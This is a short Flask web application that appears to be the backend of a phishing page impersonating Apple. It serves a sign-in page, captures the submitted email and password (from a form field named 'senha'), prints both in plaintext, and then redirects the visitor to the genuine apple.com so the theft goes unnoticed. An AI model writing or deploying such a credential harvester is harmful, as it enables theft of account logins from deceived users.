from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/sign-in')
def sign_in():
    return render_template('sign-in.html')

@app.route('/submit-login', methods=['POST'])
def submit_login():
    email = request.form.get('email')
    password = request.form.get('senha')
    print(f"Login attempt - Email: {email}, Password: {password}")
    return redirect('https://www.apple.com')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 3000))
    app.run(host='0.0.0.0', port=port)
